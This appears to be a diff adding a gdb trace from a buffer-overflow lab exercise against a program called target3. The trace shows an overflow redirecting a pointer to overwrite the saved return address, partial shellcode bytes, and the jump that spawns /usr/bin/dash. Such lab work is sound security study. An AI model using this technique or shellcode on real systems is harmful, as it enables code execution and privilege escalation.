@@ -1,0 +1,59 @@
+Breakpoint 1 at 0x804a05b: file target3.c, line 10.
+Breakpoint 2 at 0x804a062: file target3.c, line 10.
+Breakpoint 3 at 0x804a06b: file target3.c, line 12.
+Breakpoint 4 at 0x804a06d: file target3.c, line 13.
+Breakpoint 5 at 0x804a072: file target3.c, line 13.
+
+[1] target3: vulnerable() before strncpy
+EBP = 0xfff6ba48   ESP = 0xfff6b220
+BUF = EBP-0x810 = 0xfff6b238
+a   = EBP-0x10  = 0xfff6ba38
+p   = EBP-0xc   = 0xfff6ba3c
+saved EIP slot = EBP+4 = 0xfff6ba4c
+original saved EIP = 0x0804a0c0
+$1 = 0xfff6b238
+$2 = 0xfff6ba38
+$3 = 0xfff6ba3c
+
+[2] target3: AFTER strncpy (2056 bytes)
+BUF = 0xfff6b238
+a = [EBP-0x10] = 0xfff6b238
+p = [EBP-0xc]  = 0xfff6ba4c
+saved EIP is still 0x0804a0c0
+first 32 bytes at BUF (shellcode):
+0xfff6b238:	0x31	0xdb	0x8d	0x43	0x17	0x99	0xcd	0x80
+0xfff6b240:	0xeb	0x1f	0x5e	0x89	0x76	0x08	0x31	0xc0
+0xfff6b248:	0x88	0x46	0x07	0x89	0x46	0x0c	0xb0	0x0b
+0xfff6b250:	0x89	0xf3	0x8d	0x4e	0x08	0x8d	0x56	0x0c
+the 8 bytes after buf: a then p
+0xfff6ba38:	0xfff6b238	0xfff6ba4c	0x00000000	0x080e8000
+0xfff6ba48:	0xfff6ba68	0x0804a0c0	0xfffeb240	0x00000000
+
+[3] target3: just before '*p = a' (mov [eax],edx)
+EAX = p = 0xfff6ba4c
+EDX = a = 0xfff6b238
+0xfff6ba4c:	0x0804a0c0	0xfffeb240	0x00000000	0x00000000
+
+[4] target3: AFTER '*p = a'
+saved EIP slot 0xfff6ba4c now contains 0xfff6b238
+
+[5] target3: vulnerable() ret
+ESP = 0xfff6ba4c
+ret will pop = 0xfff6b238
+0xfff6ba4c:	0xfff6b238	0xfffeb240	0x00000000	0x00000000
+first instruction at target:
+   0xfff6b238:	xor    ebx,ebx
+process 7148 is executing new program: /usr/bin/dash
+/tmp/target3.gdb:66: Error in sourced command file:
+Warning:
+Cannot insert breakpoint 1.
+Cannot access memory at address 0x804a05b
+Cannot insert breakpoint 2.
+Cannot access memory at address 0x804a062
+Cannot insert breakpoint 3.
+Cannot access memory at address 0x804a06b
+Cannot insert breakpoint 4.
+Cannot access memory at address 0x804a06d
+Cannot insert breakpoint 5.
+Cannot access memory at address 0x804a072
+
